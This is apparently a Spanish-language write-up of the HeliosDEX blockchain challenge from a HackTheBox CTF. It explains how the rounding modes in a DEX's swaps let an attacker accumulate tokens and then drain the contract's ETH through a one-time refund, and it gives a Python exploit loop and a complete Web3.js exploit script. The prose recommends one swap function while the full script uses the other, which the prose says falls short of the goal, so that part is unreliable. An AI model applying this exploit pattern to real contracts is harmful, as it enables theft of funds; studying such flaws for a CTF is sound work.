---
title: "HeliosDEX - Cyber Apocalypse 2025"
layout: post
permalink: /writeups/cyberapocalypse2025/heliosdex
categories: [HacktheBox, CTF]
tags: [CyberApocalypse, HTB, Blockchain, SmartContracts, DEFI]
description: >
  Resolución del reto HeliosDEX de la categoría Blockchain durante el CTF HackTheBox Cyber Apocalypse 2025.
pin: false
toc: true
math: false
mermaid: false
---

Este reto de DEFI consiste en explotar un DEX que utiliza operaciones aritméticas peligrosas de la librería [`Math.sol` de OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol).  
El objetivo es repetir intercambios acumulando errores de redondeo y finalmente vaciar el balance del contrato con un único trade de reembolso.

---

## Descripción

Tras derrotar a Eldorion, el camino hacia la ciudad de Eldoria queda abierto. Sin embargo, pronto encuentras una estructura brillante: **HeliosDEX**, un exchange descentralizado impulsado por la energía radiante de Helios. Los viajeros lo usan para acumular fortunas antes de aventurarse en Eldoria. ¿Podrías aprovechar esta oportunidad?

---

## Conocimientos necesarios

- Comprensión básica de Solidity y estándar ERC20.
- Conocer operaciones aritméticas y comportamiento de redondeo en Solidity (`Math.mulDiv()`).
- Explotación de vulnerabilidades en mecanismos de swap y refund.

## Conocimientos adquiridos

- Identificar cómo los distintos modos de redondeo (`Floor`, `Ceil`, `Expand`) de `Math.sol` afectan los cálculos en los swaps.

---

## Escenario

Se nos proporcionan dos contratos:

- Un contrato `Setup.sol` clásico que inicializa el reto.
- El contrato vulnerable `HeliosDEX.sol`, que actúa como un DEX que permite intercambiar entre 3 tokens:
    - **EldorionFang (ELD)**
    - **MalakarEssence (MAL)**
    - **HeliosLuminaShards (HLS)**

---

## Análisis del código

### `Setup.sol`

El contrato `Setup` inicializa el `HeliosDEX` con:
- 1000 unidades de cada token
- 1000 ETH de reserva inicial

La condición de victoria es lograr que tu balance supere los **20 ETH**, partiendo de un balance inicial de ~12 ETH.

---

### `HeliosDEX.sol`

El contrato crea 3 tokens ERC20 y permite intercambiarlos mediante funciones `swapForELD()`, `swapForMAL()` y `swapForHLS()`.  
Cada swap utiliza `Math.mulDiv()` con un modo de redondeo diferente:

| Función | Modo de Redondeo | Efecto |
|---------|------------------|--------|
| swapForELD | Floor (0) | Redondea hacia abajo |
| swapForMAL | Ceil (1) | Redondea hacia arriba |
| swapForHLS | Expand (3) | Siempre redondea hacia arriba |

Además, existe una función `oneTimeRefund()` que:
- Permite devolver tokens a cambio de ETH.
- Solo puede usarse una vez por dirección.

---

## Vulnerabilidad

La clave es:
- Aprovechar el redondeo favorable en `swapForMAL()` y especialmente en `swapForHLS()`.
- Realizar múltiples swaps acumulando tokens extra debido al redondeo.
- Usar `oneTimeRefund()` para canjear todos los tokens acumulados por ETH de una sola vez.

El exploit será más efectivo utilizando `swapForHLS()`, ya que permite redondeo en **Expand**, consiguiendo siempre tokens extra.

---

## Explotación

El método consiste en repetir `swapForHLS()` muchas veces con cantidades pequeñas para acumular **HLS** que posteriormente devolveremos por una gran cantidad de ETH con un solo `refund()`.

> Nota: `swapForMAL()` solo permitiría alcanzar un máximo de 1.5x de ganancia, mientras que `swapForHLS()` puede superar el x2 requerido.

---

### Ejemplo de exploit simplificado

```python
trade_cost = 10**17 + 1 
while True:
    n_trades += 1
    print(f"\n\n[+] Trade #{n_trades}")

    # Realizamos swaps con efecto de redondeo
    csend(target_addr, "swapForHLS()", value=str(trade_cost))

    # Verificamos ganancias en tokens HLS
    hls_balance = int(ccall(hls_token, "balanceOf(address)(uint256)", player_account.address))
    print(f"[+] HLS acumulados: {hls_balance}")

    eth_gain = ((hls_balance - prev_hsl_balance) * (10**18 / exchange_ratio_hsl)) - trade_cost
    total_eth_gain = (hls_balance * (10**18 / exchange_ratio_hsl)) - (trade_cost) * n_trades
    print(f"[+] Ganancia estimada en ETH: {total_eth_gain}")

    prev_hsl_balance = hls_balance

    # Paramos cuando superamos las 20 ETH proyectadas
    if total_eth_gain >= 10e18:
        break
```

---

## Detalle adicional

Los contratos usan `Math.mulDiv()` de OZ sin cuidado al escoger los modos de redondeo:

- Algunos modos dan ventaja al contrato (`Floor`).
- Otros permiten exploits directos (`Ceil` y `Expand`).

Esto permite a un atacante realizar swaps que sistemáticamente obtienen más tokens de lo debido.

---

## Script completo (JS)

```js
require("dotenv").config();
const Web3 = require("web3"); // <-- Use Web3 as the default export, not a named export
const { setupABI, heliosDexABI, erc20ABI } = require('./abis');


async function main() {
  // 1. Initialize Web3
  const rpcUrl = process.env.RPC_URL;
  const web3 = new Web3(rpcUrl);  // Pass the RPC URL directly

  // 2. Load your private key and wallet account
  const privateKey = process.env.PRIVATE_KEY;
  const account = web3.eth.accounts.privateKeyToAccount(privateKey);
  web3.eth.accounts.wallet.add(account);
  web3.eth.defaultAccount = account.address;

  // 3. Addresses
  const setupAddress = process.env.SETUP_ADDRESS;

  // 4. Instantiate Setup contract
  const setupContract = new web3.eth.Contract(setupABI, setupAddress);

  // 5. Retrieve the HeliosDEX address
  const heliosDexAddress = await setupContract.methods.TARGET().call();
  console.log("HeliosDEX Address:", heliosDexAddress);

  // 6. Instantiate the HeliosDEX contract
  const heliosDex = new web3.eth.Contract(heliosDexABI, heliosDexAddress);

  // 7. Retrieve the MAL token address
  const malakarEssenceAddr = await heliosDex.methods.malakarEssence().call();
  console.log("MalakarEssence Token Address:", malakarEssenceAddr);

  // 8. Instantiate the MAL contract
  const malakarEssence = new web3.eth.Contract(erc20ABI, malakarEssenceAddr);

  // 9. Check initial MAL balance
  let myMalBalance = await malakarEssence.methods.balanceOf(account.address).call();
  console.log("Initial MAL balance:", myMalBalance);

  // 10. Exploit: call swapForMAL() many times with 1 wei each
  console.log("Performing repeated swaps of 1 wei for MAL...");
  const swapCount = 100;

  for (let i = 0; i < swapCount; i++) {
    await heliosDex.methods.swapForMAL().send({
      from: account.address,
      value: 1,  // 1 wei
      gas: 200000
    });
    process.stdout.write(".");
  }
  console.log("\nSwaps complete!");

  // 11. Check MAL balance
  myMalBalance = await malakarEssence.methods.balanceOf(account.address).call();
  console.log("MAL balance after exploit:", myMalBalance);

  // 12. Approve HeliosDEX to spend MAL
  console.log("Approving MAL for refund...");
  await malakarEssence.methods.approve(heliosDexAddress, myMalBalance).send({
    from: account.address,
    gas: 100000
  });

  // 13. oneTimeRefund(): MAL => Ether
  console.log("Requesting oneTimeRefund of MAL for ETH...");
  await heliosDex.methods.oneTimeRefund(malakarEssenceAddr, myMalBalance).send({
    from: account.address,
    gas: 200000
  });

  // 14. Check final Ether balance
  const finalBalanceWei = await web3.eth.getBalance(account.address);
  console.log("Final ETH balance (wei):", finalBalanceWei);
  const finalBalanceEth = web3.utils.fromWei(finalBalanceWei, "ether");
  console.log("Final ETH balance (ETH):", finalBalanceEth);

  // 15. Check if challenge is solved
  const isSolved = await setupContract.methods.isSolved().call();
  console.log("isSolved()?", isSolved);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
```

Abi:

```js
// abis.js

const setupABI = [
  {
    "type": "function",
    "stateMutability": "view",
    "name": "TARGET",
    "inputs": [],
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ]
  },
  {
    "type": "function",
    "stateMutability": "view",
    "name": "isSolved",
    "inputs": [],
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ]
  }
];

const heliosDexABI = [
  {
    "type": "function",
    "stateMutability": "payable",
    "name": "swapForMAL",
    "inputs": [],
    "outputs": []
  },
  {
    "type": "function",
    "stateMutability": "nonpayable",
    "name": "oneTimeRefund",
    "inputs": [
      { "internalType": "address", "name": "item", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "outputs": []
  },
  {
    "type": "function",
    "stateMutability": "view",
    "name": "malakarEssence",
    "inputs": [],
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ]
  }
];

const erc20ABI = [
  {
    "type": "function",
    "stateMutability": "view",
    "name": "balanceOf",
    "inputs": [
      {
        "internalType": "address",
        "name": "owner",
        "type": "address"
      }
    ],
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ]
  },
  {
    "type": "function",
    "stateMutability": "nonpayable",
    "name": "approve",
    "inputs": [
      {
        "internalType": "address",
        "name": "spender",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ]
  }
];

module.exports = {
  setupABI,
  heliosDexABI,
  erc20ABI
};
```

---
